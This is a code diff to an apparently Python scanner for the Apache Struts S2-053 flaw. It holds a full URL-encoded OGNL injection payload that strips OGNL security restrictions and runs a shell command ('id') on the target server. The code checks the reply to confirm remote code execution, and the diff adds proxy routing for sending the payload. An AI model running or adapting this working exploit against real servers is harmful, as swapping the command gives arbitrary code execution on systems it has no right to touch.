@@ -17,7 +17,7 @@ def UrlProcessing(url):
 
 payload='''redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A'''
 
-def S2_053(Url,RandomAgent):
+def S2_053(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -43,7 +43,14 @@ def S2_053(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
+        if ProxyIp != None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies,timeout=5, verify=False)
+        elif ProxyIp == None:
+            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
